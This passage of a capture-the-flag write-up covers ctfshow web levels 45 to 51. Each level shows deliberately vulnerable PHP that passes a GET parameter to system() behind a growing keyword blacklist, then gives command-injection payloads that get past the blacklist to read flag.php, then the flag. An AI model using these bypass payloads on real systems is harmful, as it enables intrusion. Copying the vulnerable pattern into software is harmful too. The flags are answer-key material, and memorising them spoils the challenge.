punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>æ–°è¿‡æ»¤äº†ç©ºæ ¼ï¼Œç©ºæ ¼ç»•è¿‡å³å¯</pre></td></tr><tr><td data-num="2"></td><td><pre>    </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">></span><span class="token string backtick-quoted-string">` `</span><span class="token operator">&lt;</span><span class="token string backtick-quoted-string">` `</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token string backtick-quoted-string">` é‡å®šå‘ç¬¦</span></pre></td></tr><tr><td data-num="4"></td><td><pre>`<span class="token operator">%</span><span class="token number">09</span><span class="token string backtick-quoted-string">`(éœ€è¦phpç¯å¢ƒ)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>`<span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token string backtick-quoted-string">`</span></pre></td></tr><tr><td data-num="6"></td><td><pre>`<span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token string backtick-quoted-string">`</span></pre></td></tr><tr><td data-num="7"></td><td><pre>`<span class="token punctuation">&#123;</span>cat<span class="token punctuation">,</span>flag<span class="token operator">.</span>php<span class="token punctuation">&#125;</span><span class="token string backtick-quoted-string">` //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½</span></pre></td></tr><tr><td data-num="8"></td><td><pre>`<span class="token operator">%</span><span class="token number">20</span><span class="token string backtick-quoted-string">`</span></pre></td></tr><tr><td data-num="9"></td><td><pre>`<span class="token operator">%</span><span class="token number">09</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>payload</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token class-name type-declaration">tac</span><span class="token variable">$IFS</span><span class="token operator">*</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token class-name type-declaration">tac</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span>f<span class="token operator">*</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token class-name type-declaration">tac</span><span class="token variable">$IFS</span><span class="token variable">$9f</span><span class="token operator">*</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span><span class="token class-name type-declaration">tac</span><span class="token variable">$IFS</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">0</span>A</pre></td></tr></table></figure><pre><code>ctfshow&#123;bc60f83a-81a0-48ba-9b2b-8d76432b5285&#125;
</code></pre><h2 id="web46"><a class="anchor" href="#web46">#</a> web46</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-05 21:50:19</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>æ–°è¿‡æ»¤äº†<span class="token number">0</span><span class="token operator">-</span><span class="token number">9</span>çš„æ•°å­—ã€$ã€æ˜Ÿå·ï¼Œé‡å®šå‘ç¬¦ç»•è¿‡å³å¯</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">></span><span class="token string backtick-quoted-string">` `</span><span class="token operator">&lt;</span><span class="token string backtick-quoted-string">` `</span><span class="token operator">&lt;</span><span class="token operator">></span>` é‡å®šå‘ç¬¦</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>payload</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">&lt;</span>fl<span class="token string single-quoted-string">''</span>ag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">09</span>fl<span class="token string single-quoted-string">''</span>ag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;7661bef9-e84e-473f-b781-312b85028f2c&#125;
</code></pre><h2 id="web47"><a class="anchor" href="#web47">#</a> web47</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-05 21:59:23</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>æ–°è¿‡æ»¤äº†moreã€lessã€headã€sortã€tailï¼ŒæŒ‘æ²¡è¿‡æ»¤æ‰çš„ä½¿ç”¨å³å¯</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">09</span>fl<span class="token string single-quoted-string">''</span>ag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">09</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">.</span><span class="token operator">??</span><span class="token operator">?</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>nl<span class="token operator">%</span><span class="token number">09</span>fl<span class="token string single-quoted-string">''</span>ag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>nl<span class="token operator">&lt;</span>fl<span class="token string single-quoted-string">''</span>ag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;2e100bbf-03eb-4936-8082-6fed00624a66&#125;
</code></pre><h2 id="web48"><a class="anchor" href="#web48">#</a> web48</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-05 22:06:20</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>æ–°è¿‡æ»¤äº†sedã€cutã€awkã€stringsã€odã€curlã€åå•å¼•å·ï¼ŒæŒ‘æ²¡è¿‡æ»¤æ‰çš„ä½¿ç”¨å³å¯</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>payload</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">09</span>fl<span class="token string single-quoted-string">''</span>ag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>nl<span class="token operator">&lt;</span>fl<span class="token string single-quoted-string">''</span>ag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;bb63b5ff-950f-4f4a-823d-a278496c21da&#125;
</code></pre><h2 id="web49"><a class="anchor" href="#web49">#</a> web49</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-05 22:22:43</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>æ–°è¿‡æ»¤äº†ç™¾åˆ†å·ï¼Œç»§ç»­ç»•è¿‡å³å¯

payload
?c=tac%09fl''ag.php||
?c=tac&lt;fl''ag.php||
?c=nl&lt;fl''ag.php||
?c=nl&lt;fl''ag.php%0a
</code></pre><pre><code>ctfshow&#123;1a7f4a4b-a785-4223-b474-fa7387ca1bef&#125;
</code></pre><h2 id="web50"><a class="anchor" href="#web50">#</a> web50</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-05 22:32:47</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>æ–°è¿‡æ»¤\x26ã€\x09ï¼Œ<span class="token operator">%</span><span class="token number">09</span>è¢«è¿‡æ»¤æ‰äº†å°±ç”¨é‡å®šå‘ç¬¦ç»•è¿‡å³å¯</pre></td></tr><tr><td data-num="2"></td><td><pre>æ³¨ï¼š<span class="token operator">&lt;</span><span class="token operator">></span>å’Œ<span class="token operator">?</span>åŒæ—¶ä½¿ç”¨ä¸å›æ˜¾ æ‰€ä»¥ç”¨\ä»£æ›¿ï¼Ÿ</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>payload</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">&lt;</span>fl<span class="token string single-quoted-string">''</span>ag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>nl<span class="token operator">&lt;</span>fl<span class="token string single-quoted-string">''</span>ag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>tac<span class="token operator">&lt;</span><span class="token operator">></span>fl\ag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;26b2154e-9d20-4af9-88b9-3c6cfe06e229&#125;
</code></pre><h2 id="web51"><a class="anchor" href="#web51">#</a> web51</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-05 22:42:52</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>æ–°è¿‡æ»¤æ‰äº†tacï¼Œnlç»•è¿‡å³å¯</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>payload</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>nl<span class="token operator">&lt;</span>fl\ag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">?</span>c<span class="token operator">=</span>nl<span class="token operator">&lt;</span>fl<span class="token string single-quoted-string">''</span>ag<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;429fb4d3-1c93-4a1d-9c19-6c85db70409a&#125;
